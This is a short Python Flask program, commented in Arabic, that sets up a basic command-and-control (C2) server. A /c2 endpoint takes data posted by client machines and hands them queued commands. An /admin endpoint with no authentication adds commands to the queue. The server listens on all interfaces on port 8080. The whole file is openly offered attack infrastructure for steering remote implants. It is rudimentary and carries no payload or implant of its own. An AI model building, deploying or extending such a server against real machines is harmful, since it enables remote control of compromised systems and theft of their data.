from flask import Flask, request, jsonify
import logging
import threading
import time

app = Flask(__name__)

# قائمة لتخزين الأوامر المرسلة إلى العملاء
commands_queue = []

# إعدادات السجل (Logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

@app.route('/c2', methods=['POST', 'GET'])
def c2_endpoint():
    """
    نقطة نهاية C2 لتلقي الطلبات من العملاء وإرسال الأوامر.
    """
    if request.method == 'POST':
        # تلقي البيانات من العميل
        data = request.json
        logging.info(f"Received data from client: {data}")

        # إرسال رد بسيط
        return jsonify({"status": "success", "message": "Data received"})

    elif request.method == 'GET':
        # إرسال الأوامر إلى العميل
        if commands_queue:
            command = commands_queue.pop(0)
            logging.info(f"Sending command to client: {command}")
            return jsonify({"status": "success", "command": command})
        else:
            return jsonify({"status": "success", "command": None})

@app.route('/admin', methods=['POST'])
def admin_endpoint():
    """
    نقطة نهاية للإدارة لإضافة أوامر جديدة إلى قائمة الأوامر.
    """
    data = request.json
    command = data.get("command")
    if command:
        commands_queue.append(command)
        logging.info(f"New command added: {command}")
        return jsonify({"status": "success", "message": "Command added"})
    else:
        return jsonify({"status": "error", "message": "No command provided"}), 400

def start_c2_server():
    """
    تشغيل خادم C2.
    """
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    logging.info("Starting C2 server...")
    start_c2_server()
